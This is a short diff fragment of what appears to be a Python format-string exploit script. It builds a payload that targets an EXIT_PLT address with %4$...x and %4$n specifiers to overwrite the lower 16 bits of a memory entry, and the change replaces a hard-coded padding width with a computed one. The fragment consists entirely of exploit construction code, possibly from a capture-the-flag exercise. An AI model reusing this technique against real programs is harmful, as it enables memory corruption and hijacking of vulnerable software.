@@ -13,7 +13,8 @@ exploit += struct.pack("I",EXIT_PLT+2)
 exploit += "BBBBCCCC"
 
 # write the lower 16 bits first
-exploit += "%4$33972x"
+lower_bits = int("84b4",16) # 33972
+exploit += f"%4${lower_bits}x"
 exploit += "%4$n"
 
 # and then write the 16 upper bits
